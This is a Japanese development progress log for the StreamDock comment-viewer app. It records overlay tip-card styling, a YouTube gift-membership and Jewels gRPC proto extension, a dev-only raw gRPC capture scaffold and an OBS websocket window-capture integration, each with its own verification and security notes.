- **検証**: desktop `typecheck`・`lint` OK ／ `vitest viewerFormat.test.ts` 23 passed（新ヘルパ含む）／ sidecar `typecheck` OK・`build:bundle` OK（禁止依存なし）。
  **実機表示はユーザー環境で確認予定**（サブスク/メンシプ/ギフトが日本語要約＋赤枠／スパチャ/ビッツ/ドネーション/ジュエルが種別ラベル＋金額＋赤枠／chat は無装飾）。
- 未対応: OBS オーバーレイの投げ銭強調（**043c**・現行意匠に赤枠相当を相乗り）は別タスクのまま。

## 2026-07-26 (043c オーバーレイ 投げ銭コメントの強調＝YouTube スパチャ風カード)

本人指示で 043c のデザインを具体化し実装した（元 043c の「現行意匠に縁取り/グロー相乗り」→ **投げ銭コメントを YouTube コメント欄の
スーパーチャット風カード（色付きヘッダ帯＋淡色ボディ）に差し替え**る方向へ具体化）。オーバーレイ（`variant="overlay"`）は従来
全コメントを同じ LINE 風吹き出しで描き `event_type` 分岐も `monetaryAmount` 表示も無かった＝投げ銭が埋もれていた（要望④）。
**表示専用の frontend 分岐追加のみ**（新規通信/依存/capability/CSP ゼロ・Rust 非変更・軽 security-review 通過）。037a 非依存で
保留中の **037b を supersede**。通常 chat は現行の吹き出しのまま非変更。

- **配色方式＝金額ティア段階配色（YT 忠実・本人選択）**: スパチャ（実通貨）は金額でティア 0..6（青→水→緑→黄→橙→桃→赤）に色分け。
  ティア体系は YT ではスパチャにしか無いため、**bits/subscription/membership/gift/donation/jewels はハイブリッドで種別ごとの単色**
  （bits=紫 / subscription=緑 / membership=ティール / gift=ピンク / donation=インディゴ / jewels=シアン）。
- **通貨換算はしない（038 の領分・スコープ外厳守）**: `superchatTier(amount, currency)`（`viewerFormat.ts`・純関数＋テスト）が
  通貨コードで 2 系統の閾値表を引くだけ＝大単位通貨（JPY 等 `[100,200,500,1000,2000,5000,10000]`）／小単位通貨（USD/EUR 等 `[1,2,5,10,20,50,100]`）。
  未知通貨は小単位表にフォールバック・境界未満はティア0にクランプ（「近似で可」に沿う）。
- **カード形状＝YT 忠実な色付きカード（本人選択・しっぽ無し）**: ヘッダ帯＝アバター（036a data URI ガード維持）＋名前＋（サイト名ピル）＋
  **金額バッジ**（`monetaryAmount` があればヘッダ右に pill）。ボディ＝金額なし種別は `composeEventMessage` の日本語要約を主表示、視聴者コメントがあれば本文を続ける。
- **窓透過維持**: カードは不透明色（`--overlay-tip-*`）でヘッダ/ボディとも塗る＝窓の `:global(html[data-overlay="1"])` 透過は不変
  （OBS ウィンドウキャプチャで背景は抜けカードのみ合成・既存 `.bubble` と同原理）。金額チップの半透過は不透明ヘッダ上に乗るため窓に影響しない。
- **追加した overlay トークン（`theme.css`）**: `--overlay-tip-fg-on-dark/-on-light`・`--overlay-tip-amount-bg/-fg`・ティア `--overlay-tip-t0..t6-bg/-body`・
  種別 `--overlay-tip-{bits,subscription,membership,gift,donation,jewels}-bg/-body`。ボディ淡色は各ヘッダ色から `color-mix(..., #fff)` で theme.css 内導出。
  **module.css には生 hex/rgba を残さず全て `--overlay-tip-*` 経由**（各ティア/種別クラスは役割 var `--tip-header-bg/-fg`・`--tip-body-bg` を差し替えるだけ）。
- **043a 未了時の挙動**: `event_type` は現行から subscription 等が到達済み＝未了でも subscription は強調カード化され見逃し解消は成立。新種別が来ればそのまま色分け（前方互換）。
- **追修正（本人フィードバック・実機目視）＝コア 043c 後の後付けデルタ**: (A) `.item flex-shrink:0`＝共有 `.list`（overflow-y:auto＋flex 縦積み）で
  子カードが圧縮され破綻するのを解消し、超過分を `.list` スクロールへ回す（overlay chat 吹き出しの溢れ挙動も「縦圧縮」→「スクロール」に統一＝改善方向・非退行）。
  (B) `.card padding:0/gap:0`＋`border-radius:12px`（18px→12px）＝色付き面をカード縁まで広げ `overflow:hidden` の角丸を実効化し、ヘッダ⇔ボディ間の
  透明スリット（黒線）を除去。角丸・レイアウトは jsdom で測れないため実機（OBS 合成）目視で最終確認。
- **dev-mock 拡充（`comment-sidecar/src/dev-mock.ts`・合成データ値のみ）＝同・後付けデルタ**: 全ティア段階配色/長文の目視用に金額バリエーション表
  （スパチャ JPY ¥100〜¥15,000＋USD／bits/donation/jewels）を `seq` 巡回化し、長文サンプル 290 字（YouTube 赤スパ本文上限参考）を 2 枠追加。
  **宛先・依存・env ゲート（`COMMENT_SIDECAR_MOCK=1`）・host-guard/fail-closed 経路は不変**（035b の「env ゲートのまま維持」を踏襲・egress ゼロ）。
- **対象ファイル**: `screens/comment-viewer/viewerFormat.ts`（`superchatTier`＋2 閾値表＋大単位通貨 Set・純関数）／`viewerFormat.test.ts`（superchatTier 仕様テスト 6 件）／
  `CommentList.tsx`（`renderOverlayItem` に chat/カード分岐・`OVERLAY_TIER_CLASS`/`OVERLAY_TYPE_CLASS`・data URI ガードを共有 icon 要素に factor）／`CommentList.test.tsx`（043c overlay カードテスト 12 件）／
  `OverlayComment.module.css`（`.card`/`.cardHeader`/`.cardName`/`.amountBadge`/`.cardBody`/`.eventMessage`/`.cardText`/`.tier0..tier6`/`.tip{Bits,…}`＋追修正A/B）／`theme.css`（上記トークン）／`comment-sidecar/src/dev-mock.ts`（上記 dev-mock 拡充）。
- **security-review（軽・通過）**: frontend 表示分岐のみ＝外部通信宛先/API/capability/依存/CSP 不変・`csp: null` 不変（`tauri.conf.json` 非変更）・`<img>`/bg-image は
  data URI のみ（036a ガード維持）・本文/金額を DB/ログに出さない（Rust 非変更）。グレップで module.css の生 hex/rgba 0 件・TS/dev-mock の fetch/invoke/新規 import 0 件を確認。判定=問題なし。
- **検証**: desktop `typecheck` OK ／ `lint`（eslint）OK ／ `vitest` 80 passed（superchatTier 6 件＋043c overlay カードテスト 12 件含む）／ sidecar `typecheck` OK・
  `build:bundle` OK（禁止依存アサート通過）／ `gen:bindings` drift ゼロ（Rust 非変更＝再生成なし）。`git diff --stat`＝9 files・+696/-36（うち docs 2 件・dev-mock 1 件・テスト 2 件）。
  **実機表示はユーザー環境で確認予定**（各投げ銭種別が YT スパチャ風カード＋金額バッジ／スパチャは金額でティア色変化／chat は従来の吹き出し／窓透過が保たれ OBS 合成できる）。

## 2026-07-26 (043d 保留継続＝解除条件 再判定：番号未確定で着手せず)

043d（YouTube ギフトメンシプ／Jewels の取得）の着手前判定を行い、**解除条件 (a)(b) いずれも未充足**と確認したため、
**proto にフィールド番号を書かず実装に着手しない**（保留継続）。gRPC の内部フィールド番号は非公開で、推測記入は
無言のデータ欠落／別フィールド衝突による破損を招くため禁止（これが保留の理由）。

- **(a) 上流 osareview proto：無い**。リポジトリに `.proto` 実ファイルは無く（node_modules 内の grpc/protobuf ライブラリ proto を除く）、
  osareview 上流も submodule/vendor されていない。現存するのは `stream-list-proto.ts` に埋め込まれた**旧 `stream_list.proto` の逐語コピー文字列**のみで、
  `MEMBERSHIP_GIFTING_EVENT`／`GIFT_MEMBERSHIP_RECEIVED_EVENT`／`GIFT_EVENT` と各 details・enum 整数番号を**含まない**（＝逐語コピー元が存在しない）。
  現状の `LiveChatMessageSnippet.Type` 実在値＝TEXT=1／NEW_SPONSOR=7／…／SUPER_CHAT=15／SUPER_STICKER=16／MEMBER_MILESTONE=17／POLL=20（gift/jewels/membership-gifting 不在）。details も SuperChat/SuperSticker/MemberMilestone のみ。
- **(b) 実配信キャプチャ：未実施**。生 gRPC のキャプチャ記録・データ・fixture は repo/docs のどこにも無い。参照先 036b の `profile_image_url=104` すら
  `display_name=103` 隣接の reverse-engineered 暫定値で、実配信確認は「未確認（ユーザー環境・実機）」のまま完了記録が無い＝継承できる「実施済みキャプチャ手順」も無い。
- **やらないこと（線引き）**: フィールド番号の推測記入（最重要・禁止）／proto・DTO・mapper・Rust・binding のコード変更／security-review 発行（実装に至らないため対象外）／
  新規宛先・OAuth スコープ・依存の追加。※043a で表示語彙（wire/Rust/binding）・dev-mock・集計退行防止テストは追加済みで、043d に残るのは実データ配線（proto 拡張＋mapper）のみ。
- **解除に必要なもの（次アクション）**: (a) osareview 最新 `stream_list.proto` を入手し 3 event の enum 整数＋details のフィールド番号があるか確認→あれば逐語コピー（まず低コストに試す）／
  (b) gift/jewels が**実発火する実配信**で生 protobuf を1度キャプチャし `protoc --decode_raw` 等で「field 番号→wire type→値」を確定（036b と同進め方・実イベント発生が最大のハードル）。
  確定後は番号の出典を明記して proto 拡張＋DTO＋mapper＋**受領側 N 件の二重計上回避方針**＋集計波及を変更計画として提示→「実装して」後に着手（新規受信面＝security-review 必須）。
- **変更**: 本エントリ（docs/progress.md）と task-board.md の 043d 行への再判定補記のみ。**コード差分ゼロ**（proto/DTO/mapper/Rust/binding 非変更）。

## 2026-07-26 (043d 解除条件(b)用: gRPC 生バイト キャプチャ足場＝dev 専用・env ゲート)

解除条件(b)（実配信の生 gRPC キャプチャで gift/jewels のフィールド番号を確定）を実行するための **dev 専用足場**を実装した
（本人指示「実装して・テストは厳密に／お金がかかるので取りこぼし不可」）。**proto/DTO/mapper は未変更**（番号確定はまだ・
043d 本体は保留継続）。**収益化済みの協力者の公開配信**に投げ銭して生バイトを捕捉→番号を逆算するアプローチ（自チャンネル
未収益化のため）。使い捨てブランチ `043d-grpc-capture-spike` で作業・番号確定後に本足場は撤去する前提。
**実装コードは git stash に退避**（`git stash list` の「043d gRPC capture scaffold」・`git stash apply` で復元）。本エントリと下記対象ファイル一覧は退避した実装の記録。

- **仕組み（2 能力・env ゲート `COMMENT_SIDECAR_CAPTURE=1`）**:
  - **生バイト捕捉**: gRPC の `responseDeserialize`（proto-loader）を **loadSync ラップで差し替え**、復号**前**の生バイトを
    0700 一時ファイル（`streamdock-yt-capture-*/frames.b64`・base64 1 frame/line・**appendFileSync 同期**＝kill でも直前
    フレーム残存）へ書く。protobuf デコーダは**未知フィールドを黙って捨てる**（`$unknownFields` 無し）ため、復号前の生
    バイトが唯一の捕捉点。`createClient` の gRPC チャネルガードは wrap で**温存**（loadSync のみ差替え）。
  - **他人の公開配信を対象化**: `COMMENT_SIDECAR_CAPTURE_VIDEO_ID=<動画ID>` 指定時、`live-stream.client.ts` が既存
    `findLiveDetails`（`videos.list?id=`）で公開配信の `activeLiveChatId` を解決して読む。未指定は現行 `findActiveOwnBroadcast`
    と**完全同一**。他人の**公開**チャット読取は `youtube.readonly` の範囲・宛先は `www.googleapis.com` のまま。
- **対象ファイル**: 新規 `src/youtube-capture.ts`（env ゲート＋dump＋runtime ラップ・副作用ゼロ・dev-mock と同契約）／
  `src/comment-fetcher/register-youtube-deps.ts`（capture ON 時のみ wrap 注入・OFF は素の guarded runtime）／
  `src/index.ts`（稼働バナー）／`vendor/.../youtube/client/live-stream.client.ts`（env ゲートの videoId seam）。
  dev スクリプト（**バンドル非同梱**）: `scripts/protobuf-raw.mjs`（protoc 非依存の生ワイヤデコーダ）／
  `scripts/decode-capture.mjs`（frames.b64→field 番号ツリー・既知番号の参照ヘッダ付き）／`scripts/test-capture.mjs`（厳密テスト）／
  `scripts/dist-alias-loader.mjs`（テストの @comment-dock alias 解決）。
- **セキュリティ（枠を広げない）**: **新規宛先/OAuth スコープ/依存ゼロ**（`host-guard.ts`/`youtube-config.ts`/`package.json`
  差分ゼロ・build:bundle 禁止依存アサート通過＝keyring/hono/dotenv 無し）。§9: 生バイト（本文/投稿者名含み得る）は 0700 一時
  ファイルのみ・非永続・端末外へ出さない・通常ログ/DB 非保存（stderr 診断は dir パス/byte 数/フレーム数のみ）。既定 OFF で
  本番挙動は byte 同一。**Rust/wire/binding/capability 非変更**。※新規受信面ではあるが proto 未拡張（番号未記入）＝本足場での
  security-review は不要と判断（実配線＝043d 本体着手時に実施）。
- **厳密テスト（`node scripts/test-capture.mjs`・45 件 PASS）**: 実 @grpc/proto-loader 経由で ①タップが実発火し生バイトが
  **入力とバイト完全一致**（未知フィールド含む・空/バイナリ/UTF-8・同期書込＝直前フレーム残存・書込失敗は throw せず計数）
  ②タップは復号出力を変えない（passthrough）③**通常復号は未知フィールドを消す**（＝生キャプチャが必須の証明）
  ④生ワイヤデコーダが未知フィールドを暴き、かつ既知番号（100602/1007/101/2/1=15/16/27/…）を**ground truth 一致**で報告
  ⑤チャネルガード温存（参照一致）＋タップ 0 件は throw（サイレント無取得の防止）⑥videoId seam のルーティング（指定→
  videos.list／未指定→liveBroadcasts＝本番不変）。host-guard 回帰・typecheck・build:bundle も通過。
- **未了（ユーザー環境）**: 実配信キャプチャ本番＝収益化済み協力者の公開配信で `COMMENT_SIDECAR_CAPTURE=1
  COMMENT_SIDECAR_CAPTURE_VIDEO_ID=<動画ID>` で起動→ギフトメンシプ/Jewels を実送信→`frames.b64` を
  `decode-capture.mjs` で読み、未知の type 整数／details field 番号を確定。番号確定後に 043d 本体（proto/DTO/mapper＋
  二重計上方針）を変更計画→実装（**その時点で security-review 必須**）。本足場は番号確定後に撤去。

## 2026-07-26 (044s obs-websocket スパイク：方式A（ウィンドウキャプチャ自動追加）に決定)

要望①（OBS へオーバーレイソースを自動追加）の方式を実測で決めるスパイク（本実装 044a はしない）。**方針反転**（033/033f の「obs-websocket 不使用」を UX 優先で覆す）前提の実現性/脆さ/工数を macOS 実機で検証し、**方式 A（ウィンドウキャプチャ）に決定**した。検証は使い捨てブランチ `044s-obs-websocket-spike`＋**リポジトリ外の単体スクリプト**（`obs-websocket-js` は検証用に別環境導入）で行い、**本体コード・依存・host-guard は未改変**（検証コードは破棄・本体マージ無し）。OBS の GUI 操作・目視は本人担当。

- **実測環境**: OBS 32.1.2（macOS）/ obs-websocket 5.7.3 / RPC v1 / `ws://127.0.0.1:4455`。ターゲットは透過窓「StreamDock コメントオーバーレイ」。
- **疎通・認証・graceful（全確認）**: 認証なし接続 ✅／認証あり接続 ✅（**パスワードはファイル経由・出力/ログ非露出**）／誤パスワード＝`4009 Authentication failed` を graceful catch ✅（hot-loop 無し）／未起動・WS 無効・ポート相違＝`ECONNREFUSED` を graceful catch ✅（単発試行＋4s timeout・実装は指数バックオフ推奨）。
- **方式 A（採用）**: macOS の kind に `window_capture`／`screen_capture` の**両方**が存在（当初推論を更新）。`window_capture` で `CreateInput`→`GetInputPropertiesListPropertyItems("window")` の候補26件から**オーバーレイ窓を窓名で発見**（`[stream-dock] StreamDock コメントオーバーレイ`）。macOS の設定は **`{owner_name, window_name, window(数値ID)}`** の3フィールドで、数値 ID は起動毎に変わるため**安定キー `owner_name`＋`window_name` を併設**→**本人目視で透過合成表示を確認**。`GetInputList` による**既存検出→重複追加防止（べき等）**、作成先は現在シーンを確認。
- **方式 B（不採用）**: `CreateInput`(`browser_source`) の URL 設定は成功するが、**OBS が loopback URL を取得しない**（自動作成/refresh/手動いずれも HTTP 取得 0 件・同 URL への `curl` は 200＝サーバ正常／「対話」で真っ黒・操作不能＝CEF 未描画）。一般には動く手法のため環境固有不具合の可能性が高いが、**ユーザー実機で現に動かず**＋**ローカル HTTP 配信の新設工数**があり不採用。
- **通信面**: `lsof -i` で OBS 接続・方式 B HTTP とも **loopback のみ・外部 ESTABLISHED ゼロ**（`[::1]:1420` は Vite dev＝IPv6 loopback）。
- **成果物（対象ファイル・ドキュメントのみ）**: [docs/tasks/044s-obs-websocket-spike.md](tasks/044s-obs-websocket-spike.md)（末尾に**スパイク結果＋方式決定メモ**）／[docs/tasks/044a-obs-auto-source-impl.md](tasks/044a-obs-auto-source-impl.md)（**方式 A 確定・実装スコープ・security 方針差分ドラフト**）／本エントリ。**security.md 本体は未編集**（正式追記は 044a で security-review を通して実施）。
- **security ドラフト要点（044a で正式化）**: §1 loopback 4455 限定解禁（外部 allow-list と分離・明示同意時のみ）／**fail-closed 論点＝現 WS ガードは DI スコープ＆`wss:` 必須で obs-websocket-js を素通りするため global WebSocket ガード新設（既存 WSS＋`ws://127.0.0.1:4455` のみ許可）を推奨**／§9 パスワード非ログ非外部送信・loopback WS に平文で載せない／§10 新規依存 `obs-websocket-js`（Rust に async/WS/HTTP crate は足さない・方式 A なので HTTP サーバ新設なし）。
- **044a 実装スコープ**: sidecar に OBS クライアント新規 module（ユーザー有効化時のみ接続・べき等作成・graceful フォールバック）／制御フレーム配線（[index.ts](../apps/comment-sidecar/src/index.ts)）／UI トグル＋パスワード＋手動フォールバック案内（[SettingsView.tsx](../apps/desktop/src/screens/comment-viewer/SettingsView.tsx) 364-425）。capability/`csp: null` 不変。
- **未了（Windows 未検証）**: Windows の `window_capture` は `window` 指定が `title:class:exe` 文字列・WGC/透過・DPI が macOS と異なる（本スパイクは macOS 実測のみ）。044a では OS 分岐で窓指定を組み立て、**Windows は 098（VM）で実挙動確認**。方式 B は「描画不具合の解消＋HTTP 配信整備」が揃えば再検討可（覆すには再実測）。
- **やらないこと（線引き）**: 本実装（044a）・外部通信の追加（検証も loopback のみ）・`obs-websocket-js` の本採用（044a で §10 記録＋security-review 後）・security.md 本体の編集。
- **変更**: 上記ドキュメント3ファイルのみ。**本体コード差分ゼロ・依存追加ゼロ・host-guard 未改変**（検証コード/依存は scratchpad に隔離し破棄・使い捨てブランチ削除済み・`git status` は成果物ドキュメントのみ）。

## 2026-07-26 (044a OBS オーバーレイソース自動追加＝方式A obs-websocket 連携・実装)

044s で決定した**方式A（ウィンドウキャプチャ自動追加）**を実装（本人「実装して」）。オーバーレイ ON かつ「OBS へ自動追加（連携）」ON で、OBS に `ws://127.0.0.1:4455`（loopback）で接続し、透過オーバーレイ窓「StreamDock コメントオーバーレイ」を **window_capture ソースとして自動追加（既存なら再利用）**する。失敗時は手動手順へ graceful フォールバック。**方針反転（033/033f）＋新規 loopback 通信＋新規依存のため security-review 必須**（下記「実装後レビュー」で自己確認済み・別セッションでの security-review スキル実施を推奨）。作業ブランチ `044a-obs-auto-source`。

- **仕組み（通信面は sidecar 封じ込め・Rust 完全同期）**:
  - **sidecar OBS クライアント**（新規 `src/obs/obs-client.ts`）: `obs-websocket-js` v5 でオンデマンド接続（enable のたびに connect→ソース確保→disconnect・常時接続を張らない）。`GetSceneList`/`GetInputList`（既存検出→重複防止）/`CreateInput`(`window_capture`)/`GetInputPropertiesListPropertyItems("window")`/`SetInputSettings`。**mac**＝`{owner_name, window_name, window(数値ID)}`（数値 ID は起動毎に変わるため安定キー owner_name/window_name を併設）、**win**＝`window`=`title:class:exe` 文字列＋**`method`=WGC（Windows 10 1903以降）を自動設定**（既定「自動」だと透過窓が黒くなるため・追加2）。失敗は graceful（obs.state=failed・hot-loop しない）。
  - **fail-closed 二層**: ①ホストピン留め（`127.0.0.1` をコード定数化・port のみ検出値）②接続直前 `assertAllowedObsUrl()`（`host-guard.ts` 新規 export・`ws://127.0.0.1:<port>` のみ許可・他 throw）。obs-websocket-js は `isomorphic-ws`→`ws` を使い global `WebSocket` を通らないため global ガードは無効＝この2層で loopback 限定を担保。外部 allow-list（fetch/WSS/gRPC）は不変。
  - **制御/秘密の分離**: 連携 ON/OFF は loopback WS 制御フレーム（`obs-enable{port}`/`obs-disable`・非秘密）、状態は `obs.state`。**OBS パスワードは WS に載せず** UI→Rust `set_obs_websocket_password`→**OS キーチェーン**（`token_vault` account `obs-websocket`）→sidecar へ **stdin private pipe**（`COMMENT_SIDECAR_OBS_PW=`）。起動時は keychain から復元行を stdin へ書く。**認証は OBS 側で有効なときのみ**要求（read-only 検出の `auth_required` で判定）。
  - **read-only 状態検出**（新規 `src/obs_config.rs`・`detect_obs_websocket_config`）: OBS の `plugin_config/obs-websocket/config.json` を OS 別既定パスで **read-only** 読取し `server_enabled`/`server_port`/`auth_required` を返す。**`server_password` は読まない・書き込みは一切しない**（§5）。ts-rs バインディング `ObsWsConfig`。
  - **UI**: `SettingsView` の OBS オーバーレイカードに「OBS へ自動追加（連携）」トグル＋状態表示＋（認証必要時のみ）パスワード入力＋（WS 未有効時）有効化ガイド。オーバーレイ ON と連動して自動追加を試行。入力パスワードは保存後に即クリア（localStorage 非保存）。
- **対象ファイル**:
  - 新規: `apps/comment-sidecar/src/obs/obs-client.ts`／`apps/desktop/src-tauri/src/obs_config.rs`／`apps/desktop/src/features/comment-viewer/obsApi.ts`／`apps/desktop/src/features/comment-viewer/bindings/ObsWsConfig.ts`（ts-rs 生成）。
  - 変更: sidecar `src/host-guard.ts`（`assertAllowedObsUrl`＋export）・`src/index.ts`（制御フレーム/stdin PW/obs.state 配線）・`package.json`（obs-websocket-js）・`scripts/test-host-guard.mjs`（OBS 15 ケース）。Rust `comment_sidecar/token_vault.rs`（`obs` arm）・`comment_sidecar/mod.rs`（spawn 復元＋write ヘルパ＋set/clear）・`lib.rs`（mod obs_config＋2 コマンド＋generate_handler）。frontend `commentStream.ts`（enableObs/disableObs＋obs.state）・`overlaySettings.ts`（obsAutoAdd 永続）・`CommentViewerApp.tsx`（状態/検出/ハンドラ/props）・`SettingsView.tsx`（UI）。docs `security.md`（§1 例外＋§10 依存）。
- **セキュリティ（docs/security.md §1 例外 044a 追記）**: loopback 4455 のみ・明示有効化時のみ・sidecar 封じ込め・Rust 完全同期・main no-internet 不変。パスワード非ログ/非平文（WS 非搭載）/keychain/§9。config.json は read-only・password 非読取・非書込・OS 別既定パスのみ（§5/§7）。新規依存 obs-websocket-js（§10・Rust crate ゼロ・HTTP サーバ新設なし）。capability・`csp: null` 不変。
- **検証（macOS）**: `pnpm --filter ./apps/comment-sidecar typecheck` PASS／`node scripts/test-host-guard.mjs`（OBS 15 追加含め全 PASS）／`build:bundle`（obs-websocket-js バンドル・禁止依存アサート PASS）／`pnpm --filter ./apps/desktop typecheck`・`lint` PASS／`cargo check` PASS／`gen:bindings` で ObsWsConfig.ts 生成。
- **未了（ユーザー環境・要実施）**: ①**フル SEA 再ビルド**＝配布 Client ID 焼き込みが必須のため `TWITCH_CLIENT_ID=... YOUTUBE_CLIENT_ID=... YOUTUBE_CLIENT_SECRET=... pnpm --filter ./apps/desktop build:sidecar` を本人が実行（sidecar 変更を反映）。②**macOS 実機 E2E**（`pnpm tauri dev`＝OBS 起動＋WS 有効で オーバーレイ ON→自動追加/再利用・認証有はパスワード入力後接続・WS 無効は検出＋ガイド・未起動/認証失敗は graceful・`lsof -i` で loopback 限定）。③**Windows（098 VM）**＝`method`=WGC の実 enum 確認＋`title:class:exe` 解決で追加手作業なしで表示。④**別セッションで security-review スキル実施**（新規 loopback 通信＋新規依存＋外部アプリ config read-only 読取）。⑤**OBS 有効化の図解スクリーンショット素材**（public/ 同梱・現状はテキスト手順）。⑥コミットは本人指示待ち（現在 `044a-obs-auto-source` ブランチ・未コミット）。

## 2026-07-26 (044a UX 改善: 表示OFF連動の非表示・設定UI 整理)

044a の実機フィードバックを反映した UX 改善（本人「実装して」）。**loopback 4455 限定・sidecar 封じ込め・パスワード非ログ/非WS（§9）・capability/CSP 不変・新規依存ゼロ**は維持したまま、表示連動と設定 UI の可読性のみ直した。

- **表示OFFで OBS からも消す（削除ではなく非表示）**: オーバーレイ表示 OFF 時に OBS 側ソースを **`SetSceneItemEnabled(false)` で非表示**にし、ON で `enable()` が `SetSceneItemEnabled(true)` して再表示する（既存ソース再利用でも復帰）。RemoveInput は使わない。制御フレーム `obs-hide{port}` を追加（`index.ts` union/parse/dispatch・port 検証は obs-enable と同一）。sidecar `obs-client.ts` に `setOverlaySceneItemEnabled` ヘルパ＋`hide(port)` メソッド（best-effort＝該当なし/未起動でも idle・失敗ノイズを出さない）。frontend `commentStream.ts` に `hideObs(port)`、`CommentViewerApp.tsx` に `requestObsHide()`＋`handleOverlayToggle` OFF 連動（`obsAutoAdd` 有効時のみ）。**非表示トリガーは「表示」トグル OFF のみ**（連携トグル OFF は従来どおり連携停止のみ）。
- **設定 UI 整理（`SettingsView.tsx`）**: ①連携トグル/オーバーレイ表示の説明を簡潔化（冗長な一文を削除）。②WS 未有効ガイドを **赤字（既存 `.errorText`）＋手順リスト（新規 `.obsGuideSteps`）**に。③パスワード欄はキャプション/キーチェーン注記を撤去し、**取得方法をフォーム下の折りたたみ（native `<details>`「OBSのサーバーパスワード取得方法」・新規 `.obsPasswordHelp`）**に移動。④入力欄を短幅（`.searchInput`）にし、**保存＝主要色 `.btn`／削除＝`.btnGhost` を入力の横に**並べる（placeholder で用途提示）。⑤状態表示は added/reused を **区別せず「OBSにオーバーレイを表示しました。」**に統合。⑥失敗表示は生エラー（ECONNREFUSED 等）を撤去し **赤字（`.errorText`）で「OBSに接続できませんでした。OBSが起動しているか確認してください。」**に。`obsReason` の UI 受け渡しは廃止。
- **docs**: security.md §1 例外に「作成/再利用ソースの表示・非表示切替（SetSceneItemEnabled・削除しない）・新規外部宛先/依存ゼロ」を明記。
- **対象**: sidecar `obs-client.ts`／`index.ts`。frontend `commentStream.ts`／`CommentViewerApp.tsx`／`SettingsView.tsx`／`CommentViewerApp.module.css`。docs `security.md`。テスト `SettingsView.obs.test.tsx`／`commentStream.obs.test.ts` 更新。
- **未了**: フル `build:sidecar` 再ビルド後の macOS 実機 E2E（表示OFF→OBS で非表示／ON→再表示／短幅レイアウト目視／`lsof` で loopback 限定）。Windows(098) は従来どおり未検証。

## 2026-07-27 (043d YouTube ギフトメンシプ／Jewels の取得＝公式 proto で番号確定・受信面拡張・実装)

043d を**保留解除して実装**（本人「実装して」）。旧保留の前提「gift/jewels の gRPC フィールド番号は非公開」は**誤り**で、`liveChatMessages.streamList` は公式メソッドであり **Google が `stream_list.proto` の全文（enum 整数値・フィールド番号込み）を公式ガイドにインライン掲載**している（出典 `https://developers.google.com/youtube/v3/live/streaming-live-chat`）。実装セッションでも同ページを独立に再取得し、タスクの番号表と**完全一致**を確認した（**推測ゼロ**）。あわせて公式 proto との既存ズレ 2 件を修正。**新規受信面のため security-review 実施（通過）**。

- **確定した公式番号（すべて出典あり）**: `MEMBERSHIP_GIFTING_EVENT = 18`／`GIFT_MEMBERSHIP_RECEIVED_EVENT = 19`（enum のみ宣言）／`GIFT_EVENT = 21`／`membership_gifting_details = 31`／`gift_details = 34`／`LiveChatMembershipGiftingDetails.gift_memberships_count = 1`／`LiveChatGiftDetails.jewels_amount = 3`。enum は公式集合へ整合（`TOMBSTONE=2`/`FAN_FUNDING_EVENT=3`/`CHAT_ENDED_EVENT=4`/`SPONSOR_ONLY_MODE_{STARTED,ENDED}_EVENT=5,6` を追加、**公式に存在しない `MESSAGE_DELETED_EVENT=8`/`MESSAGE_RETRACTED_EVENT=9`（旧 vendored 独自値）を削除**）。未採用フィールドは**番号だけコメントに記録**（`text_message_details=19`/`user_banned_details=22`/`new_sponsor_details=29`/`poll_details=33`/SuperChat の `amount_display_string=3`・`user_comment=4`・`tier=5`/SuperSticker の 3/4/5/author の `channel_url=102`・`is_verified=4`〜`is_chat_moderator=7`/response の `page_info=1004`・`active_poll_item=1008`）。
- **判明した既存バグ 2 件を修正**:
  - **`member_month = 1` → `2`**（公式の 1 は `member_level_name`＝string）。string を uint32 として読むため月数が誤るだけでなく**読み取り位置が壊れる**。ミューテーション検証で実測したところ protobufjs が `invalid wire type 6` を **throw** した＝マイルストーン到達時にそのメッセージ（バッチ）ごとデコードが落ちていた可能性が高い。修正で正しい月数を読む。
  - **`amount_micros` を `string` → `uint64`**（公式型。string=length-delimited と uint64=varint でワイヤ型不一致だった）。`loadSync` の `longs: String` により uint64 は文字列で届くため、**DTO（`amount_micros: string`）と mapper（`Number(...)`）は無変更**で正しく動く（根拠を DTO にコメント化）。
  - `author_details.profile_image_url = 104` は**公式と一致＝正しいと確定**し、036b の「⚠ 未確定（要実レスポンス検証）」注記を解消。
- **決定1（受領側を取り込まない）を proto の宣言で担保**: `gift_membership_received_details = 32` は**そもそも宣言しない**ため、`member_level_name`/`gifter_channel_id`/`associated_membership_gifting_message_id` は**デコードされない**（§9 最整合・1 購入 N 件発火の二重計上ゼロ）。「受信してから捨てる」ではなく「受信しない」構造。
- **公式構造のうち意図的に採らなかったもの**（ワイヤ表現は同一・理由を proto にコメント）: `oneof displayed_content`（`oneofs: true` で仮想プロパティが増えるだけ）／`TypeWrapper.Type` ネスト／`google.protobuf.Duration`（`gift_duration` 不採用のため import 不要・SEA の proto 解決経路は単一ファイルのまま不変）。`gift_url` は**画像取得＝CSP/§9 の新論点を生むため意図的に除外**。
- **mapper 配線**: `MEMBERSHIP_GIFTING_EVENT → gift`／`GIFT_EVENT → jewels`。受領側は**マップに載せない**（未対応 type 除外で 0 件・理由と再修正条件をコメント）。`giftCount` は `defaults: true` で 0 が入るケースを `mapGiftCount` で undefined へ劣化（「0 件贈りました」を作らない・Twitch の `?? 1` とは意図的に別扱い）。Jewels は `mapJewelsAmount` で `{ currency: "JEWELS", amount }`（**micros 換算しない**＝043a dev-mock と同形）。
- **表示語彙の最小修正**: `composeEventMessage` に `source?` を追加し、YouTube の gift は「〇〇さんが**メンバーシップギフト**を N 件贈りました」（Twitch は従来どおり「サブギフト」）。呼び出し側 `CommentList.tsx`（136/262 行）は `CommentViewDto` を丸ごと渡しており `source` を含むため**引数変更なし**。
- **波及なし（実コードで確認・変更ゼロ）**: shared `COMMENT_EVENT_TYPES.GIFT/.JEWELS`・converter の素通し・`wire.ts` の `EVENT_TYPE_MAP`・Rust `CommentEventType::Gift/::Jewels`＋`gift_count`・ts-rs binding・集計 SQL（`subscription_count = event_type IN ('subscription','membership','gift')` に YouTube ギフトが自然に入り、`JEWELS` は `bits_count`（`currency='BITS'`）にも `superchat_count`（`event_type='superchat'`）にも混ざらない）はすべて 043a 済み。リクエストの `part`/`profile_image_size` も不変＝**追加リクエスト・クォータ影響なし**。
- **Jewels の金額バッジ表記（既知の差・現状維持を選択）**: `wire.ts` は BITS のみ特別扱いのため、実データの Jewels は `"30 JEWELS"`、dev-mock は `"30 jewels"` と大小が食い違う。**wire 無変更を優先して現状のまま**とした（金額自体は正確・機能影響なし）。統一したくなったら `toCanonicalComment` に JEWELS 分岐を 1 行足す。
